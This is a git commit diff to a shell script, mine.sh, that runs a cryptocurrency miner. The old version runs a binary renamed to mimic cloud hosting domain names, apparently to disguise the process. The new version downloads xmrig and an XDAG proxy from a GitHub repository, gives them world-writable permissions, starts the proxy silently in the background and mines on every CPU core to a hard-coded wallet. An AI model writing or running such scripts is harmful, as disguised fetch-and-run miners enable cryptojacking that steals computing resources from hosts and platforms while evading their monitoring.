bf236547530a5dcc6af0a5d402f72ab9c67afb73
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 05:01:40 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
-apt update
-chmod u+x surabi
-mv surabi scalingo.com.google.com.heroku.com.github.com
-./scalingo.com.google.com.heroku.com.github.com --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)
+wget https://github.com/Intan90002/dagx/raw/main/config.json
+wget https://github.com/Intan90002/dagx/raw/main/xmrig2xdag
+wget https://github.com/Intan90002/dagx/raw/main/xmrig
+chmod 777 xmrig xmrig2xdag config.json
+./xmrig2xdag -c config.json > /dev/null 2>&1 &
+./xmrig -o 127.0.0.1:3232. -u a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p x -a rx/xdag -t$(nproc --all)
